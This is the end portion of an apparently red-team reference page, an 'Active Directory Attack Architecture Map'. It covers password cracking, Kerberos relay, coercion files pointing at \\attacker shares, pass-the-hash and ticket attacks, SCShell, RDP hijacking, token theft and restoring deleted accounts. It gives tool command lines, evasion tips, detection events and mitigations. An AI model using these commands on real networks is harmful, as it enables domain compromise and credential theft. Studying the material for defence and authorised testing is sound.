  <div class="detail-card border-green"><span class="tag cred">CRACKING</span><h3>Cracking Workflow</h3><div class="card-sub">Efficient order of operations</div><div class="card-body"><ul class="card-list"><li><strong>Step 1</strong>: <span class="val">Quick wins</span> &mdash; check against NTLM.pw / CrackStation online (NT hashes only)</li><li><strong>Step 2</strong>: <span class="val">rockyou + best64.rule</span> &mdash; catches ~60% of weak passwords in minutes</li><li><strong>Step 3</strong>: <span class="val">rockyou + OneRuleToRuleThemAll</span> &mdash; deeper mutations, ~30min</li><li><strong>Step 4</strong>: <span class="val">Custom wordlist</span> &mdash; CeWL company website + seasonal/company name patterns with rules</li><li><strong>Step 5</strong>: <span class="val">Mask attacks</span> &mdash; common corporate password patterns (?u?l?l?l?l?l?d?d?s)</li><li><strong>Step 6</strong>: <span class="val">Large wordlists</span> &mdash; CrackStation/Weakpass + rules (hours to days)</li><li><strong>Step 7</strong>: <span class="val">Combinator</span> &mdash; <code>hashcat -a 1</code> combines two wordlists (word1+word2)</li><li><strong>NT hashes</strong>: Try everything. <strong>DCC2/AES TGS</strong>: Stop at step 4 &mdash; too slow for mask attacks.</li></ul></div></div>
</div>

<div class="separator"></div>

<footer>
  Active Directory Attack Architecture Map
</footer>

<div class="separator"></div>

<!-- ==================== ADDITIONAL TECHNIQUES ==================== -->
<div class="section-header"><h2><span>//</span> Additional <span class="red">Techniques</span></h2><p class="section-desc">Techniques that don't fit neatly into the above categories but are essential for a complete AD attack toolkit.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag privesc">PRIVESC</span><h3>KrbRelayUp</h3><div class="card-sub">Local privilege escalation via Kerberos relay &mdash; domain user &rarr; local admin</div><div class="card-body"><ul class="card-list"><li>Exploits the ability to <strong>coerce local SYSTEM</strong> into authenticating via Kerberos, then relays that auth to LDAP</li><li><strong>Step 1</strong>: Create a machine account (default: any domain user can create up to 10)</li><li><strong>Step 2</strong>: Trigger SYSTEM auth locally (DCOM, OXID resolver, etc.)</li><li><strong>Step 3</strong>: Relay Kerberos auth to LDAP &rarr; set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> (RBCD)</li><li><strong>Step 4</strong>: Use S4U chain with controlled machine account &rarr; get TGS as admin for local host</li><li><code class="tool">KrbRelayUp.exe</code> relay -Domain dom -CreateNewComputerAccount -ComputerName FAKE$ -ComputerPassword pass</li><li><code class="tool">KrbRelayUp.exe</code> spawn -m rbcd -d dom -cn FAKE$ -cp pass</li><li><strong>Also supports</strong>: Shadow Credentials (ADCS) and PKCS12 authentication instead of RBCD</li><li><strong>Requirements</strong>: LDAP signing NOT enforced, MachineAccountQuota &gt; 0 (or pre-existing machine acct)</li><li><strong>Mitigation</strong>: Enable LDAP signing, set MachineAccountQuota to 0</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag deleg">DELEG</span><h3>Kerberos Relay (krbrelayx)</h3><div class="card-sub">Relay Kerberos authentication &mdash; the Kerberos equivalent of NTLM relay</div><div class="card-body"><ul class="card-list"><li>Unlike NTLM relay, Kerberos relay requires <strong>specific conditions</strong>: victim must auth to attacker-controlled SPN</li><li><strong>DNS takeover</strong>: Register DNS record pointing to attacker &rarr; victim's Kerberos auth goes to attacker</li><li><code class="tool">krbrelayx.py</code> &mdash; the main tool: listens for incoming Kerberos auth and relays it</li><li><code class="tool">dnstool.py</code> &mdash; add/modify DNS records in AD-integrated DNS (ADIDNS)</li><li><strong>Unconstrained delegation abuse</strong>: If target has unconstrained delegation, extract TGTs from relayed auth</li><li><strong>Use cases</strong>: Unconstrained delegation exploitation, ADCS abuse, targeted credential capture</li><li><strong>Key difference from NTLM relay</strong>: Kerberos tickets are service-specific (SPN-bound), so relay targets are limited</li></ul></div></div>

  <div class="detail-card border-rose"><span class="tag cred">CRED</span><h3>File Drop Coercion (LNK / SCF / URL)</h3><div class="card-sub">Drop malicious files on shares &rarr; auto-trigger NTLM authentication when browsed</div><div class="card-body"><ul class="card-list"><li>Windows automatically resolves UNC paths in certain file types when a folder is <strong>browsed</strong> (not clicked)</li><li><strong>SCF file</strong>: <code>[Shell] IconFile=\\attacker\icon</code> &mdash; Explorer loads icon path automatically</li><li><strong>LNK file</strong>: Shortcut with icon pointing to <code>\\attacker\share</code> &mdash; resolved on browse</li><li><strong>URL file</strong>: <code>IconFile=\\attacker\icon</code> &mdash; similar to SCF</li><li><strong>desktop.ini</strong>: Set folder icon to UNC path &mdash; resolved when folder is opened</li><li><code class="tool">ntlm_theft</code> &mdash; generates all file types automatically</li><li><code class="tool">Farmer</code> &mdash; creates and manages various coercion file types</li><li><strong>Receive hashes</strong>: <code class="tool">Responder</code> captures NTLMv2 &rarr; crack with hashcat 5600 or relay</li><li><strong>Naming trick</strong>: Prefix with <code>@</code> or space to sort first in directory listing</li><li><strong>Requires</strong>: Write access to a share that users browse (SYSVOL, department shares, etc.)</li></ul></div></div>

  <div class="detail-card border-green"><span class="tag lateral">LATERAL</span><h3>Pass-the-Hash / Pass-the-Ticket / Overpass-the-Hash</h3><div class="card-sub">The classic fundamentals &mdash; reuse captured credentials without knowing plaintext passwords</div><div class="card-body"><ul class="card-list"><li><strong>Pass-the-Hash (PtH)</strong>: Use NT hash directly to authenticate via NTLM &mdash; no password cracking needed. Works with SMB, WMI, WinRM, RDP (Restricted Admin)</li><li><strong>Tools</strong>: <code class="tool">impacket</code> (<code>-hashes :NTHASH</code>), <code class="tool">NetExec</code>, <code class="tool">evil-winrm -H</code>, <code class="tool">mimikatz</code> <code>sekurlsa::pth</code></li><li><strong>Pass-the-Ticket (PtT)</strong>: Inject stolen Kerberos TGT/TGS into current session &mdash; <code class="tool">Rubeus</code> <code>ptt /ticket:base64</code></li><li><strong>Overpass-the-Hash</strong>: Use NT hash to request a Kerberos TGT &mdash; <code class="tool">Rubeus</code> <code>asktgt /user:X /rc4:HASH</code>. Converts NTLM material to Kerberos for environments blocking NTLM</li><li><strong>Pass-the-Key</strong>: Same as overpass but using AES256 key instead of RC4/NT hash &mdash; less detectable, preferred when available</li><li><strong>Pass-the-Certificate</strong>: Use stolen ADCS certificate for PKINIT auth &mdash; <code class="tool">Certipy</code> <code>auth -pfx cert.pfx</code></li><li><strong>RDP Restricted Admin</strong>: <code>mstsc /restrictedadmin</code> allows RDP with just NT hash &mdash; must be enabled on target</li><li><strong>Detection</strong>: Event 4624 Type 9 (PtH), 4768 with unusual encryption types (overpass), anomalous logon patterns</li></ul></div></div>

  <div class="detail-card border-green"><span class="tag lateral">LATERAL</span><h3>SCShell &amp; Service-Based Execution</h3><div class="card-sub">Fileless lateral movement via service configuration changes &mdash; no new service creation, port 135 only</div><div class="card-body"><ul class="card-list"><li><code class="tool">SCShell</code>: Changes an existing service's binary path via <code>ChangeServiceConfigA</code> &rarr; starts service &rarr; code executes &rarr; restores original path</li><li><strong>No Event 7045</strong>: Unlike PsExec, SCShell modifies existing services instead of creating new ones &mdash; avoids the #1 lateral movement detection</li><li><strong>Port 135 only</strong>: Uses DCERPC/SVCCTL &mdash; does not require SMB (445) for file transfer</li><li><strong>Fileless</strong>: No binary dropped to disk &mdash; the service binary path points to a command line (e.g., <code>cmd /c payload</code>)</li><li><strong>XOR encrypted</strong>: Network traffic is XOR-encrypted to avoid signature detection</li><li><strong>Authentication</strong>: Supports pass-the-hash natively &mdash; <code>SCShell.exe target service user domain hash command</code></li><li><strong>Modified SCShell</strong>: Find stopped services with DLLs NOT in System32 &mdash; replace the DLL and start the service. No config change needed, even stealthier</li><li><strong>OPSEC</strong>: Event 7040 (service config change) may still fire &mdash; but far less monitored than 7045 (new service)</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag lateral">LATERAL</span><h3>RDP Session Hijacking</h3><div class="card-sub">Take over disconnected RDP sessions without credentials</div><div class="card-body"><ul class="card-list"><li>Disconnected RDP sessions remain active in memory with the user's token</li><li>With <strong>SYSTEM privileges</strong> on the RDP host, you can connect to any disconnected session</li><li><code class="tool">query user</code> &mdash; list active and disconnected sessions</li><li><code class="tool">tscon</code> TARGET_SESSION_ID /dest:YOUR_SESSION &mdash; switch to target session</li><li>If running as SYSTEM via <code class="tool">PsExec -s</code>: <code>tscon 2 /dest:console</code></li><li><strong>No password needed</strong> &mdash; SYSTEM can hijack any session on the machine</li><li><strong>Useful when</strong>: DA/privileged user has a disconnected session on a compromised host</li><li><strong>Detection</strong>: Event 4778 (session reconnected), Event 4779 (session disconnected)</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag privesc">PRIVESC</span><h3>Token Impersonation</h3><div class="card-sub">Steal or impersonate tokens from running processes &rarr; escalate privileges</div><div class="card-body"><ul class="card-list"><li>Every process/thread in Windows has an <strong>access token</strong> defining its security context</li><li>With <code>SeImpersonatePrivilege</code> (service accounts, IIS, MSSQL) &rarr; impersonate any token</li><li><code class="tool">elevate_pid_bof</code>: BOF that steals a process token by PID and spawns a new process under that token &mdash; inline, no fork &amp; run</li><li><code class="tool">incognito</code> (Meterpreter) &mdash; list_tokens / impersonate_token "DOMAIN\Admin"</li><li><strong>Cobalt Strike</strong>: <code>steal_token PID</code> to impersonate, <code>rev2self</code> to revert. <code>make_token</code> for credential-based impersonation</li><li><code class="tool">GodPotato</code> / <code class="tool">JuicyPotato</code> / <code class="tool">SweetPotato</code> &mdash; SeImpersonate &rarr; SYSTEM</li><li><code class="tool">PrintSpoofer</code> &mdash; SeImpersonate &rarr; SYSTEM via Spooler pipe</li><li><code class="tool">RunasCs</code>: Runas replacement with PTH support (dev branch) &mdash; create process with alternate credentials</li><li><strong>Delegation tokens</strong>: Users logged in interactively &mdash; can be fully impersonated</li><li><strong>Impersonation tokens</strong>: Network logons &mdash; limited to local resource access</li><li><strong>OPSEC</strong>: Token theft is local &mdash; no network traffic, no new logon events. One of the quietest escalation techniques</li><li><strong>Requirement</strong>: <code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code></li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag acl">ACL</span> <span class="tag privesc">PRIVESC</span><h3>The Walking Dead &mdash; Disabled Object Abuse</h3><div class="card-sub">Disabled/forgotten AD accounts with residual ACLs &rarr; re-enable &rarr; privilege escalation</div><div class="card-body"><ul class="card-list"><li>Disabled AD accounts are often <strong>not deleted</strong> &mdash; they retain their group memberships, ACLs, and attributes</li><li>Other principals may still have <strong>inbound ACL relationships</strong> (GenericAll, GenericWrite, WriteDACL) pointing to disabled accounts</li><li>If you have sufficient DACL permissions on a disabled account, you can <strong>re-enable it</strong></li><li><strong>Attack</strong>: Find disabled privileged account &rarr; verify you have GenericAll/WriteDACL &rarr; re-enable &rarr; authenticate as that user</li><li><code class="tool">LazarusWakeUp</code> (Python) &mdash; identifies disabled objects and analyzes inbound ACL relationships</li><li><code class="tool">LazarusWakeUp</code> find-all &mdash; discover all disabled objects with exploitable ACLs</li><li><code class="tool">LazarusWakeUp</code> enable -t targetUser &mdash; re-enable the disabled account</li><li>Also works with <strong>disabled computer accounts</strong> &mdash; same principle applies</li><li><strong>Why overlooked?</strong> BloodHound marks disabled accounts differently &mdash; most attackers skip them entirely</li><li><strong>OPSEC</strong>: Re-enabling triggers <strong>Event ID 4722</strong> (user account enabled) &mdash; detectable with Sigma rules</li><li><strong>Mitigation</strong>: Delete disabled accounts instead of just disabling them, audit ACLs on disabled objects regularly</li></ul><p style="margin-top:10px;padding:8px 12px;background:rgba(139,92,246,0.06);border-left:2px solid var(--purple);border-radius:4px;font-size:11px;color:var(--text-dim);line-height:1.6;"><strong style="color:var(--purple);">Why does this work?</strong> Disabling an account only flips the ACCOUNTDISABLE flag in userAccountControl. All ACLs, group memberships, SPNs, and attributes remain intact. The "dead" account is still fully wired into AD's permission graph &mdash; it just can't authenticate. Re-enabling it brings all those privileges back to life instantly.</p></div></div>

  <div class="detail-card border-purple"><span class="tag acl">ACL</span> <span class="tag privesc">PRIVESC</span><h3>AD Recycle Bin &mdash; Deleted Object Exploitation</h3><div class="card-sub">Restore deleted AD objects to recover privileges, group memberships, and credentials</div><div class="card-body"><ul class="card-list"><li>AD Recycle Bin (Windows Server 2008 R2+) preserves <strong>all attributes</strong> of deleted objects for 180 days</li><li>Deleted objects retain: group memberships, SID History, ACL entries, description fields, custom attributes</li><li><strong>Object lifecycle</strong>: Deleted (attributes preserved, 180 days) &rarr; Tombstoned (most attributes stripped, SID History retained) &rarr; Recycled (unrecoverable)</li><li><strong>Enumerate deleted objects</strong>: Use LDAP control OID <code>1.2.840.113556.1.4.2064</code></li><li><code class="tool">bloodyAD</code> get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name</li><li><code class="tool">bloodyAD</code> get writable --include-del &mdash; find deleted objects you have write access to</li><li><code class="tool">bloodyAD</code> set restore 'S-1-5-21-...-1104' &mdash; restore deleted object with all attributes</li><li><strong>Escalation vectors</strong>: Restored object regains privileged group memberships, SID History granting admin rights, ACL entries on critical objects</li><li><strong>Credential harvesting</strong>: Deleted objects may contain cleartext passwords in description/info fields</li><li><strong>Requirements</strong>: LIST_CHILD on Deleted Objects container + Restore Tombstoned control access right</li><li><strong>Detection</strong>: Event <strong>5138</strong> (directory service object undeleted), audit Directory Service Changes</li><li><strong>Limitation</strong>: SharpHound/BloodHound CE currently cannot enumerate deleted objects</li></ul></div></div>
</div>

</div>
</body>
</html>
